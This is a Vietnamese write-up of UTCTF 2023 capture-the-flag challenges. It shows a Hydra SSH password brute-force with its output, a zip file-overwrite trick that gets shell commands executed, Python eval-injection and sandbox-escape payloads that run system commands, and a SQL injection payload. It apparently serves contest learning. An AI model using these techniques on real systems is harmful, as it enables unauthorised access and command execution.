# UTCTF 2023 #



## Forensics ##

### "Easy" Volatility ###

![](https://i.imgur.com/ae4Ty0A.png)

Như tên bài, easy thật :)))

Bài này cung cấp cho ta sẵn symbol của dump file luôn nên độ khó và thời gian làm coi như giảm tới 80% rồi :)))

Mình bỏ symbol vào đường dẫn ``\volatility3\volatility3\symbols\linux`` file zst chứa json

![](https://i.imgur.com/fidU2zt.png)

Sau đó mình giải nén và nén lại bằng đuôi ``.xz`` vì nếu không thì sẽ không chạy.

Rồi thì chạy volatility thôi :)))

Đề bài bảo là "in as shell command" nên mình dùng plugin ``linux.bash``

```
py vol.py -f 'C:\Users\kietbui\OneDrive - actvn.edu.vn\Documents\UTCTF2023\debian11.core\debian11.core' linux.bash
Volatility 3 Framework 2.4.1
Progress:  100.00               Stacking attempts finished
PID     Process CommandTime     Command

467     bash    2023-03-05 18:21:23.000000      # 08ffea76-b232-4768-a815-3cc1c467e813
```
Đề bài có đề cập tới việc flag trông giống UUID, vậy flag là:
``08ffea76-b232-4768-a815-3cc1c467e813``

### What Time is It? ###

![](https://i.imgur.com/HknHGy3.png)

Bài này cho file mail, việc của mình làm tìm ngày giờ thật sự mà mail đó được gửi.

![](https://i.imgur.com/k3zry27.png)

Mở bằng notepad

![](https://i.imgur.com/M7bzDHY.png)

Mình dùng phần mềm eml viewer mở lên nhưng không tìm thấy gì. Sau đó mình nghĩ tới [DKIM](https://vi.wikipedia.org/wiki/DomainKeys_Identified_Mail) nhưng mà không phải, sau đó mình stuck và đi hỏi a @Bquanman thì ảnh gửi cái [link này](https://www.metaspike.com/gmail-mime-boundary-delimiter-timestamps)

Mình tải phần mềm về và nhập boundary delimiter vào

![](https://i.imgur.com/nlcZq1A.png)

Flag là: ``utflag{03/04/2023-06:06}``


## Reverse Engineering ##

### Reading List ###

![](https://i.imgur.com/OW3MqIv.png)

Mở bằng IDA64:

![](https://i.imgur.com/jmfIOxg.png)

Shift + f12 để xem string và tìm được flag

![](https://i.imgur.com/LoR5SLl.png)

### Game ###

![](https://i.imgur.com/wRmRsQG.png)

Bài này cho file game, kiểm tra bằng lệnh linux thì thấy đây là Macromedia Flash data

```
$ file game
game: Macromedia Flash data (compressed), version 10
```

Bài này khó ở chỗ đi tìm được và đúng tool để decompile, ban đầu mình tìm được cái tool gì đó mà bị sai nên mình đi hỏi thì được tool: JPEXS Free Flash Decompiler

Mở file Game -> Text search -> "utflag", bùm ra flag

![](https://i.imgur.com/bBcseb6.png)


## Networking ##

### A Network Problem - Part 1 ###

![](https://i.imgur.com/0iEppkO.png)

```
nc betta.utctf.live 8080
Hi Wade! I am using socat to broadcat this message. Pretty nifty right? --jwalker utflag{meh-netcats-cooler}
```

Hoặc có thể dùng nmap:

![](https://i.imgur.com/jhP0TMm.png)


### A Network Problem - Part 2 ###

![](https://i.imgur.com/JaEhVJU.png)

Ở bài này thì server dùng SMB Port (port 445).
Ban đầu mình nghĩ theo hướng dùng SMBClient để tương tác với SMB Server nhưng không được

```
$ smbclient -L betta.utctf.live -p 8445
Password for [WORKGROUP\k137]:

        Sharename       Type      Comment
        ---------       ----      -------
        WorkShares      Disk      Sharing of work files
        BackUps         Disk      File Backups.
        IPC$            IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
Thế nên sau đó mình google để tìm một giải pháp khác, mình search với cụm từ "smb port ctf" để tìm kiếm những write-up nào đấy tương tự bài này.
Thật may mắn khi ngay sau đó mình tìm được bài [này](https://ctftime.org/writeup/26536) và đây cũng là bài của giải này 2 năm trước.

Mình sử dụng ``smbget`` (smbget is a simple utility with wget-like semantics, that can download files from SMB servers) để download files từ SMB Server

```
smbget -R smb://betta.utctf.live:8445
Password for [k137] connecting to //betta.utctf.live/IPC$:
Using workgroup WORKGROUP, user k137

smb://betta.utctf.live:8445/WorkShares/shares/Advertising/Advertising Plan
smb://betta.utctf.live:8445/WorkShares/shares/Advertising/Logos/JACT.png
smb://betta.utctf.live:8445/WorkShares/shares/OfficeFun/JaysCats/Meowfoy.jpg
smb://betta.utctf.live:8445/WorkShares/shares/IT/Itstuff/notetoIT
Can't open directory smb://betta.utctf.live:8445/BackUps: Permission denied
Failed to download /BackUps: Permission denied
```

Sau khi download xong thì mình xem qua các file trong thư mục đã tải thì tại đường dẫn ``WorkShares\shares\IT\Itstuff`` có một file tên là ``notetoIT``, mình mở lên bằng notepad và đọc nội dung trong đó

```
I don't understand the fasination with the magic phrase "abracadabra", but too many people are using them as passwords. Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood all basically have the same password. Can you please reach out to them and get them to change thier passwords or at least get them append a special character? 

-- Arty F.

utflag{out-of-c0ntrol-access}
```

Lưu ý là nội dung trong file này còn được sử dụng cho challenge tiếp theo.

Okay vậy là mình đã tìm được flag.

### A Network Problem - Part 3 ###

![](https://i.imgur.com/ERZhVPa.png)


Challenge này sử dụng máy chủ SSH (port 22).
Nhìn vào tiêu đề thì cũng có thể đoán được muốn giải được bài này phải tìm được ussername và pasword để truy cập vào máy chủ SSH.
Vậy nên mình tìm hiểu về Hydra cũng như cách brute force SSH
https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/

Sau khi tìm hiểu thì mình bị bí ở cái chỗ dùng từ điển vì ``rockyou`` thì có quá nhiều từ mà brute force SSH qua Hydra nhìn chung thì khá lâu, vậy nên mình tìm thử ``common SSH username password wordlist``, mình tìm được cái [này](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) nhưng không bruteforce được.

Thế là mình tìm giải pháp trên google "ssh port ctf utctf" thì mình tìm được bài [này](https://ctftime.org/writeup/32497), bài này giống đến 80% bài mình đang giải và cũng cùng tác giả luôn.

Sau khi đọc một hồi và nhớ tới dòng "We've gathered a lot of information..." thì mình nhớ tới đống dữ liệu mình tìm ở bài trước 

Oke, thế là mình quay lại, dùng đống dữ liệu đấy để làm cái wordlist, bao gồm những cái tên: Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood và password mặc định có thể là "abracadabra". Tất cả word được tạo theo quy tắc ``standard unix username conventions``. 

Cái wordlist mình tạo có khoảng >200 words, bao gồm những cái tên kia, con mèo của Jay Walker và những thứ mà mình nghĩ có thể là username, mình brute force quá trời mà vẫn không đúng nên mình bruteforce cả password, sau đó 2 tiếng vẫn không ra gì nên mình *đọc kỹ* lại file "notetoIT" và mình chú ý đến cụm ``Can you please reach out to them and get them to change thier passwords or at least get them append a special character`` mà ban đầu mình nghĩ là câu này để nói với người chơi.
Sau đó mình tạo thêm 1 đống words là ``abracadabra + ký tự đặc biệt``
Rồi mình brute force lại và bùm, thành công.

```
k137@DESKTOP-0AHURMK:/mnt/c/Users/kietbui/OneDrive - actvn.edu.vn/Documents/UTCTF2023$ hydra -L usr.txt -P pass.txt ssh:
//betta.utctf.live:8822 -t 10
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-12 22:42:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 9216 login tries (l:96/p:96), ~922 tries per task
[DATA] attacking ssh://betta.utctf.live:8822/
[STATUS] 126.00 tries/min, 126 tries in 00:01h, 9090 to do in 01:13h, 10 active
[STATUS] 102.00 tries/min, 306 tries in 00:03h, 8910 to do in 01:28h, 10 active
[STATUS] 97.71 tries/min, 684 tries in 00:07h, 8532 to do in 01:28h, 10 active
[STATUS] 95.60 tries/min, 1434 tries in 00:15h, 7782 to do in 01:22h, 10 active
[STATUS] 94.52 tries/min, 2930 tries in 00:31h, 6286 to do in 01:07h, 10 active
[STATUS] 94.72 tries/min, 4452 tries in 00:47h, 4764 to do in 00:51h, 10 active
[STATUS] 94.30 tries/min, 5941 tries in 01:03h, 3275 to do in 00:35h, 10 active
[STATUS] 94.20 tries/min, 7442 tries in 01:19h, 1774 to do in 00:19h, 10 active
[STATUS] 94.00 tries/min, 8930 tries in 01:35h, 286 to do in 00:04h, 10 active
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-13 00:21:06
k137@DESKTOP-0AHURMK:/mnt/c/Users/kietbui/OneDrive - actvn.edu.vn/Documents/UTCTF2023$ hydra -L usr.txt -P pass.txt ssh://betta.utctf.live:8822 -t 100
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-13 00:22:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[ERROR] Option -t needs to be a number between 1 and 64
k137@DESKTOP-0AHURMK:/mnt/c/Users/kietbui/OneDrive - actvn.edu.vn/Documents/UTCTF2023$ hydra -L usr.txt -P pass.txt ssh://betta.utctf.live:8822 -t 64
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-13 00:22:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 30625 login tries (l:175/p:175), ~479 tries per task
[DATA] attacking ssh://betta.utctf.live:8822/
[STATUS] 3563.00 tries/min, 3563 tries in 00:01h, 27191 to do in 00:08h, 64 active
[STATUS] 3546.67 tries/min, 10640 tries in 00:03h, 20114 to do in 00:06h, 64 active
[STATUS] 3561.57 tries/min, 24931 tries in 00:07h, 5823 to do in 00:02h, 64 active
[STATUS] 3560.12 tries/min, 28481 tries in 00:08h, 2273 to do in 00:01h, 64 active
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-13 00:30:56
k137@DESKTOP-0AHURMK:/mnt/c/Users/kietbui/OneDrive - actvn.edu.vn/Documents/UTCTF2023$ hydra -L usr.txt -P pass.txt ssh://betta.utctf.live:8822 -t 64
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-13 00:34:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 39550 login tries (l:175/p:226), ~618 tries per task
[DATA] attacking ssh://betta.utctf.live:8822/
[8822][ssh] host: betta.utctf.live   login: wcoldwater   password: abracadabra$
[STATUS] 1824.00 tries/min, 1824 tries in 00:01h, 37855 to do in 00:21h, 64 active
[STATUS] 1058.33 tries/min, 3175 tries in 00:03h, 36504 to do in 00:35h, 64 active
[STATUS] 842.43 tries/min, 5897 tries in 00:07h, 33782 to do in 00:41h, 64 active
[STATUS] 760.87 tries/min, 11413 tries in 00:15h, 28266 to do in 00:38h, 64 active
```
Rồi mình dùng username và password tìm được để đăng nhập vào máy chủ SSH và lấy flag

```
k137@DESKTOP-0AHURMK:/mnt/c/Users/kietbui$ ssh -p 8822 wcoldwater@betta.utctf.live
The authenticity of host '[betta.utctf.live]:8822 ([44.201.8.3]:8822)' can't be established.
ECDSA key fingerprint is SHA256:cyn2IR/k0KcmytEMLgr31ZfQUFAxpSzSGy0ljHbOJCc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[betta.utctf.live]:8822,[44.201.8.3]:8822' (ECDSA) to the list of known hosts.
wcoldwater@betta.utctf.live's password:
utctf{cust0m3d-lsts-rule!} well done!
327f93bdc02d:~$ ls
note.txt
327f93bdc02d:~$ cat note.txt
Note to self: Get better at this security stuff.
```
``Clear network`` :siuuuuuu:

**Phần sau do @longkd719 viết**

## Misc ##

### Zipper ###
![](https://i.imgur.com/j2TPmWI.png)
Challenge cho 2 file
commands.zip.b64
```
UEsDBAoAAAAAADmPYVYAAAAAAAAAAAAAAAAJABwAY29tbWFuZHMvVVQJAAN95v9jfeb/Y3V4CwABBOgDAAAE6AMAAFBLAwQKAAAAAAAtj2FWWhLOtxMAAAATAAAAFAAcAGNvbW1hbmRzL2NvbW1hbmQudHh0VVQJAANm5v9jZub/Y3V4CwABBOgDAAAE6AMAAGVjaG8gJ0hlbGxvIFdvcmxkISdQSwMEFAAAAAgAMY9hVpwcB1ZUAAAAaQAAABIAHABjb21tYW5kcy9SRUFETUUubWRVVAkAA27m/2Nu5v9jdXgLAAEE6AMAAAToAwAANcrtDYAgDEXRVd4Axh0cpUKjxPIRWhS2l5j47yb3bArJ6QApXI6Rkl+t2+xkFJKCSqn5Zv9fXWAnQ4caRzxBBNzZNWMEwwSoLDQ+VFmbmGInd60vUEsBAh4DCgAAAAAAOY9hVgAAAAAAAAAAAAAAAAkAGAAAAAAAAAAQAO1BAAAAAGNvbW1hbmRzL1VUBQADfeb/Y3V4CwABBOgDAAAE6AMAAFBLAQIeAwoAAAAAAC2PYVZaEs63EwAAABMAAAAUABgAAAAAAAEAAACAgUMAAABjb21tYW5kcy9jb21tYW5kLnR4dFVUBQADZub/Y3V4CwABBOgDAAAE6AMAAFBLAQIeAxQAAAAIADGPYVacHAdWVAAAAGkAAAASABgAAAAAAAEAAACAgaQAAABjb21tYW5kcy9SRUFETUUubWRVVAUAA27m/2N1eAsAAQToAwAABOgDAABQSwUGAAAAAAMAAwABAQAARAEAAAAA
```
verìy_hash.py
```python!
import hashlib
import os
import sys
import zipfile

def get_file(name, archive):
    return [file for file in archive.infolist() if file.filename == name][0]

archive = zipfile.ZipFile(sys.argv[1])
file = get_file("commands/command.txt", archive)
data = archive.read(file)
md5 = hashlib.md5(data).hexdigest()

if md5 == "0e491b13e7ca6060189fd65938b0b5bc":
    archive.extractall()
    os.system("bash commands/command.txt")
    os.system("rm -r commands")
else:
    print("Invalid Command")
```
server netcat: `nc betta.utctf.live 12748`
Theo như description thì mình sẽ gửi một đoạn mã base64 đến server, server sẽ decode nó thành dữ liệu của một file zip, sau đó đọc file `commands/command.txt` rồi hash nội dung trong file đó sao cho đoạn hash đó bằng đoạn hash đã cho, nếu bằng thì nó sẽ thực thi câu lệnh shell trong file command đó
![](https://i.imgur.com/tRt6oNk.png)

Mình cũng bỏ ra khá nhiều thời gian cho bài này, đầu tiên là đoạn hash đề bài cho chính là hash md5 của chuỗi `echo 'Hello World!'`. Ý tưởng ban đầu của mình là pad thêm các bytes phía sau nội dung để có được một đoạn hash md5 hợp lệ, nhưng mà cách này không có khả dụng :)), và tác giả cũng nói là đây không phải là cách hợp lệ nên mình cũng bỏ qua luôn

Sau một hồi lâu suy nghĩ và tính toán thì mình có ý tưởng zip 2 file command.txt lại để rồi khi extract ra thì nó sẽ ghi đè lên nhau. 

Đầu tiên mình tạo ra 2 file command.txt và commans.txt trong folder commands sau đó zip folder này lại. Mình sử dụng câu lệnh `sed -i 's/commans/command/g' commands.zip && cat commands.zip | base64 -w 0`, câu lệnh này có nghĩa là thay thế các chuỗi có tên commans thành command
![](https://i.imgur.com/ErbbajS.png)
Vậy là thành công, khi nó extract là sẽ ghi đè lên nhau
```
UEsDBAoAAAAAAMyybVYAAAAAAAAAAAAAAAAJAAAAY29tbWFuZHMvUEsDBBQAAAAIAMeybVZaEs63FQAAABMAAAAUAAAAY29tbWFuZHMvY29tbWFuZC50eHRLTc7IV1D3SM3JyVcIzy/KSVFUBwBQSwMEFAAAAAgA87JtVnswo9kOAAAADAAAABQAAABjb21tYW5kcy9jb21tYW5kLnR4dEtOLFFIy0lM1yupKAEAUEsBAh8ACgAAAAAAzLJtVgAAAAAAAAAAAAAAAAkAJAAAAAAAAAAQAAAAAAAAAGNvbW1hbmRzLwoAIAAAAAAAAQAYAAUaNp2/VdkBBRo2nb9V2QHacRmJv1XZAVBLAQIfABQAAAAIAMeybVZaEs63FQAAABMAAAAUACQAAAAAAAAAIAAAACcAAABjb21tYW5kcy9jb21tYW5kLnR4dAoAIAAAAAAAAQAYAEblgZe/VdkBRuWBl79V2QEQUkmLv1XZAVBLAQIfABQAAAAIAPOybVZ7MKPZDgAAAAwAAAAUACQAAAAAAAAAIAAAAG4AAABjb21tYW5kcy9jb21tYW5kLnR4dAoAIAAAAAAAAQAYAC8XNMm/VdkBLxc0yb9V2QHZA/WYv1XZAVBLBQYAAAAAAwADACcBAACuAAAAAAA=
```
![](https://i.imgur.com/t9mGDKk.png)
`Flag: utflag{https://youtu.be/bZe5J8SVCYQ}`

## Web ##

### Calculator ###

![](https://i.imgur.com/qhLuC7E.png)

Đây là một chương trình đoán số mà chương trình random, nếu đoán trúng thì mình sẽ được một password để qua level này

![](https://i.imgur.com/JjD5hFm.png)

**Level 0:**
Mình thử truyền vào một chuỗi `"abc"` thì chương trình trả về lỗi

![](https://i.imgur.com/AF9ChwB.png)

Từ đó mình biết được đây là một chương trình python sử dụng hàm eval để thực thi đầu vào của mình. Trong python hàm `eval()` sử dụng để thực thi các câu lệnh python
Vậy nên ở level này mình sẽ thử sử dụng hàm `dir()` trước. Dir() sẽ trả về một danh sách các thuộc tính hợp lệ của đối tượng.

Thử gửi `print(dir())`

![](https://i.imgur.com/ut95SZl.png)

Như mình có thể thấy thì mình có thể sử dụng biến `password` và `solution` luôn. Vậy nên mình cứ `print(password)` là win

Gửi `print(password)` và mình có được password Level 0: `PuXqj7n4WNZzStnWbtPv`

![](https://i.imgur.com/9Rjv5pR.png)

**Level 1:**

Ở level 1 khác với level 0 là sử dụng hàm `eval(answer, {"open": None})`. Có nghĩa là mọi hàm open sử dụng trong answer đều được trả về None

![](https://i.imgur.com/0aQ5cRl.png)

`print(dir())` thì mình thấy các thuộc tính hợp lệ ở đây đã có giới hạn, có nghĩa là mình không thể trực tiếp `print(password)` được nữa

![](https://i.imgur.com/sC5IJ6A.png)

Thử RCE với câu lệnh `exec()` trong python thì câu lệnh `eval()` có chức năng thực thi câu lệnh python, nhưng câu lệnh `exec()` có chức năng thực thi đoạn code python

Gửi đi `exec("import os; os.system('ls')")`, kết quả trả về 2 file password.txt và problem.py

![](https://i.imgur.com/nfKW4hM.png)

Đọc file password.txt `exec("import os; os.system('cat password.txt')")`
Password level 1: `Krdi9yQuY8mHoteZDCF5`
![](https://i.imgur.com/WC0U29r.png)

**Level 2:**

Ở level 2 thì ta có hàm eval như sau`result = eval(answer, {})`, khác với level 1 thì ở đây nó không còn hạn chế tham số open nữa, nhưng mà như bài trước thì mình vẫn có thể RCE

![](https://i.imgur.com/JLsN7qQ.png)

RCE để đọc source `problem.py`: `exec("import os; os.system('cat problem.py')")`

![](https://i.imgur.com/F3lJR0n.png)

```python!
import random, os
password = open("password.txt").read()
os.remove("password.txt") # No more reading the file!

solution = random.getrandbits(32)

answer = input()
result = eval(answer, {})

if result == solution:
    print(f"{result}, correct!  The password is '{password}'.")
else:
    print(f"Result: {result}.  The correct answer was {solution}.")
```

Như mình thấy trong source code thì sau khi đọc file password thì chương trình xoá luôn file password.txt

Mình cũng đã thử nhiều cách để recovery lại file password này nhưng mà đều fail hết :))

Nhưng mà suy nghĩ theo luồng chương trình thì mỗi lần chạy file problem.py thì chương trình đều phải đọc file password.txt rồi sau đó là xoá file password.txt này luôn, nếu như chương trình này cùng chạy trên một server thì chương trình phải tạo ra file password mới sau đó là xoá nó. Vậy nên mình sẽ liên tục RCE và cat password.txt dù chỉ có một vài milisecond

Sử dụng Burp Intruder 

![](https://i.imgur.com/9Rf0p6X.png)

Payload:

![](https://i.imgur.com/kuMzSDI.png)

Kết quả sau khi attack
Password level 2: `E46Dnqb5enAMgGArbruu`
![](https://i.imgur.com/TTaHYl1.png)

**Level 3:**
Ở level này mình không thể RCE như các level trước được nữa, vì ở đây hàm eval đã chặn mình sử dụng `__builtins__`, nếu như không có `__builtins__` thì mình không thể sử dụng các hàm, câu lệnh như `open, import, print,...`
![](https://i.imgur.com/k0ITrxf.png)

Nhưng mà trong bộ nhớ python cũng đã có import rất nhiều thư viện rồi, trong số đó cũng có thể thực hiện được RCE
Mình có thể xem cách bypass eval khi không có builtins ở đây [https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins)
Và mình có được payload `__builtins__.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls+-al').read()`
Như mình có thể thấy thì trên server có tồn tại 3 file
![](https://i.imgur.com/EjrT6rp.png)

cat exploit.txt và mình có được password: `5F4p7aLgQ5Nfn5YM8s68`
![](https://i.imgur.com/psUgWjl.png)

Sau khi submit password level 3 thì mình có được flag: `utflag{LGvb7PJXG5JDwhsEW7xp}`
![](https://i.imgur.com/ymFfr0X.png)

### A tribute to Bataille ###
![](https://i.imgur.com/xcwpxXV.png)


Giao diện trang web như sau
![](https://i.imgur.com/wyX8jRa.png)

Ở cuối trang web có một phần submit confession
![](https://i.imgur.com/ONmHhm0.png)

Mình thử đọc qua source code trước thì mình thấy chương có một phần khả nghi ở bức ảnh đầu trang web
![](https://i.imgur.com/hD48r2G.png)

IDOR để đến `/images/img1.png` thì mình thấy được một hình ảnh có chứa một đoạn code ó vẻ là đoạn INSERT confession vào database
![](https://i.imgur.com/mcbxhZx.png)

Mình cũng đoán ra được đây là lỗi SQL injection, và phần submit form kia chính là post confession lên database

Mình thử POST confession lên thử xem sao nhưng mà lúc được lúc không
Lúc post được thì nó trả về `thanks for confessing[]` còn không thì nó trả về `Hey that's not a confession!` 
![](https://i.imgur.com/S5pI7lO.png)

Xem lại source code để đối chiếu thì phía sau `thanks for confessing` là `str(comments)` cũng chính là ``[]`` ở phía sau output ở ảnh trên 
Mình xem lại đoạn code trên và phân tích, 3 dòng đầu chỉ là thực thi câu query insert, đoạn code `comments = c.fetchall()` có nghĩa là trả về kết quả câu query dưới dạng list, với mỗi phần từ là tuple là kết quả của các cột 
Để inject vào câu query trên thì mình có thể đóng câu query trước để thực hiện câu query sau, payload: `"); SELECT * FROM confessions-- -`
![](https://i.imgur.com/mzcMK45.png)
`Flag: utflag{thanks_for_confessing_your_sins}`
